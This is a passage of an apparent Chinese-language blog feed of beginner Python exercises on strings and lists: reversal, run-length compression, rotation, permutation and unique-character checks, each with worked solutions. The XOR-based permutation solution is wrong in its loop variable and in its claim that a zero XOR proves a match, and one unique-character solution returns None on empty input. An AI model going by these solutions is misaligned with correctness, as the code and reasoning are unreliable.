id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chars <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> chars <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> chars    chars<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> chars<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>使用列表的reverse()方法实现列表反转</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day4</title>
      <link href="//code/python/pythontip-100days-day4/"/>
      <url>//code/python/pythontip-100days-day4/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>将输入字符串<code>str</code>,例如’HHHEELLLOOOO’，压缩为’H3E2L3O4’。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>None -&gt; None</li><li>‘’ -&gt; ‘’</li><li>‘ABBC’ -&gt; ‘AB2C’</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>字符串字符仅由ascii字符组成</li><li>大小写敏感</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>1.寻找连续出现的字符，并计算出现次数</p><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CompressString</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> string <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> string<span class="token punctuation">:</span>            <span class="token keyword">return</span> string        result <span class="token operator">=</span> <span class="token string">''</span>        prev_char <span class="token operator">=</span> string<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        count <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">:</span>            <span class="token keyword">if</span> char <span class="token operator">==</span> prev_char<span class="token punctuation">:</span>                count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> self<span class="token punctuation">.</span>_calc_partial_result<span class="token punctuation">(</span>prev_char<span class="token punctuation">,</span> count<span class="token punctuation">)</span>                prev_char <span class="token operator">=</span> char                count <span class="token operator">=</span> <span class="token number">1</span>        result <span class="token operator">+=</span> self<span class="token punctuation">.</span>_calc_partial_result<span class="token punctuation">(</span>prev_char<span class="token punctuation">,</span> count<span class="token punctuation">)</span>        <span class="token keyword">return</span> result            <span class="token keyword">def</span> <span class="token function">_calc_partial_result</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> prev_char<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> prev_char <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span> <span class="token keyword">if</span> count <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">)</span>                           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>统计连续出现字符的次数</li><li>当前字符与上一字符不相同时，对上一字符进行压缩</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day3</title>
      <link href="//code/python/pythontip-100days-day3/"/>
      <url>//code/python/pythontip-100days-day3/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串<code>str1</code>,<code>str2</code>判断str1是否是str2旋转后的字符串</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>None,’hello’ -&gt; False</li><li>None,None -&gt; False</li><li>‘’,’’ -&gt; False</li><li>‘hello’,’ehllo’-&gt; False</li><li>‘hello’,’llohe’ -&gt; True</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>字符串字符仅由ascii字符组成</li><li>大小写敏感</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>枚举所有可能的旋转点并进行判断</li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_rotation</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><blockquote><p>此题有两种解法</p></blockquote><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_rotation</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> s2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">and</span> s1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>如果s1由s2旋转而来，则一定存在一个位置作为分隔，使得s1的前段子串等于s2的后段子串，s1的后段子串等于s2的前段子串</li></ol><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_rotation</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> s2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> s1 <span class="token keyword">in</span> s2 <span class="token operator">+</span> s2<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>          <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>如果s1由s2旋转而来，s2 + s2 必然包含s1,例如 s1 = ‘hello’,s2 = ‘llohe’,s2 + s2 = ‘llohellohe’</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_rotation_find</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> s2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s1 <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能：</strong></p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点：</strong></p><ol><li>思想和解法2一样，只是使用了find()方法，比解法2稍微麻烦一点。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day2</title>
      <link href="//code/python/pythontip-100days-day2/"/>
      <url>//code/python/pythontip-100days-day2/</url>
      
        <content type="html"><![CDATA[<h1 id="确定字符串是否是另一个的排列"><a href="#确定字符串是否是另一个的排列" class="headerlink" title="确定字符串是否是另一个的排列"></a>确定字符串是否是另一个的排列</h1><p>给定两个字符串<code>str1</code>,<code>str2</code>, 判断<code>str1</code>是否是<code>str2</code>字符的一个排列。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">is_permutation('Hello','Hlleo') -&gt; True is_permutation('Hello','lleho') -&gt; Falseis_permutation("cat", "catt") -&gt; Falseis_permutation("world", "dlwor") -&gt; True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>字符串字符仅由ascii字符组成</li><li>大小写敏感</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>对字符串进行排序</li><li>统计每个字符出现的次数</li></ol><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_permutation</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(nlogn)</code>，因为使用了排序</li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li><code>sorted</code>函数:将字符串按照其中字符字典序排序并返回排序后的字符的list</li></ol><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_permutation</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    unique_counts1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    unique_counts2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        unique_counts1<span class="token punctuation">[</span>char<span class="token punctuation">]</span> <span class="token operator">=</span> unique_counts1<span class="token punctuation">.</span>get<span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>        unique_counts2<span class="token punctuation">[</span>char<span class="token punctuation">]</span> <span class="token operator">=</span> unique_counts2<span class="token punctuation">.</span>get<span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> unique_counts1 <span class="token operator">==</span> unique_counts2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>利用<code>dict</code>统计每个字符出现的次数</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_permutation</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter    counter1 <span class="token operator">=</span> Counter<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    counter2 <span class="token operator">=</span> Counter<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token keyword">return</span> counter1 <span class="token operator">==</span> counter2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能：</strong></p><ol><li>时间复杂度：<code>O(2n)</code></li><li>空间复杂度：<code>O(3n)</code></li></ol><p><strong>关键点：</strong></p><ol><li>与解法二想法一样，只是使用了<code>Counter</code>统计频率</li></ol><h3 id="解法4："><a href="#解法4：" class="headerlink" title="解法4："></a>解法4：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_permutation</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    str1_xor <span class="token operator">=</span> <span class="token number">0</span>    str2_xor <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        str1_xor <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> str2<span class="token punctuation">:</span>        str1_xor <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> str1_xor <span class="token operator">^</span> str2_xor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>性能：</p><ol><li>时间复杂度：O(2n)</li><li>空间复杂度：O(1)</li></ol><p>关键点：</p><ol><li>利用异或，相同字符异或结果为0。如果两个字符串异或结果为0的话，证明两个字符串中出现的字符和字符频率相同</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day1</title>
      <link href="//code/python/pythontip-100days-day1/"/>
      <url>//code/python/pythontip-100days-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="确定字符串是否包含唯一字符"><a href="#确定字符串是否包含唯一字符" class="headerlink" title="确定字符串是否包含唯一字符"></a>确定字符串是否包含唯一字符</h1><p>给定一个字符串<code>string</code>，如果该字符串所有字符唯一则返回<code>True</code>，否则返回<code>False</code>。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">has_unique_chars(None) -&gt; Falsehas_unique_chars("") -&gt; Truehas_unique_chars("hello") -&gt; Falsehas_unique_chars("world") -&gt; True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>字符串字符仅由ascii字符组成</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>统计每个字符的出现次数</li><li>你能想到不借助额外数据结构的解法吗？</li></ol><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">has_unique_chars</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> string <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>python中集合(set)的特性:<strong>无重复元素</strong></li></ol><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">has_unique_chars</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> string <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    chars_set <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> chars_set<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            chars_set<span class="token punctuation">.</span>add<span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>python中集合(set)的特性：<strong>无重复元素</strong></li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">has_unique_chars</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> string <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">:</span>        <span class="token keyword">if</span> string<span class="token punctuation">.</span>count<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>String对象的<code>count</code>方法:统计输入字符在该String对象内出现的次数</li></ol><h3 id="解法4："><a href="#解法4：" class="headerlink" title="解法4："></a>解法4：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">has_unique_chars</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    统计字频判断重复    :param string:    :return:    """</span>    <span class="token keyword">if</span> string <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter    d <span class="token operator">=</span> Counter<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">for</span> value <span class="token keyword">in</span> d<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong></p><ol><li>时间复杂度O(2n)</li><li>空间复杂度O(n)</li></ol><p><strong>关键点</strong></p><ol><li>利用<code>Counter</code>统计字符频率：如果字符出现次数大于1，则表示字符串中字符的数量不唯一</li></ol><h3 id="解法5："><a href="#解法5：" class="headerlink" title="解法5："></a>解法5：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">has_unique_chars</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    排序比较相邻是否相同判断重复    :param string:    :return:    """</span>    <span class="token keyword">if</span> string <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    al <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span>    al<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    alcount <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>al<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token builtin">iter</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>alcount<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">iter</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> alcount<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> al<span class="token punctuation">[</span><span class="token builtin">iter</span><span class="token punctuation">]</span> <span class="token operator">==</span> al<span class="token punctuation">[</span><span class="token builtin">iter</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong></p><ol><li>时间复杂度：<code>O(2n)</code></li><li>空间复杂度：<code>O(2n)</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python yaml使用</title>
      <link href="//code/python/python-yaml-shi-yong/"/>
      <url>//code/python/python-yaml-shi-yong/</url>
      
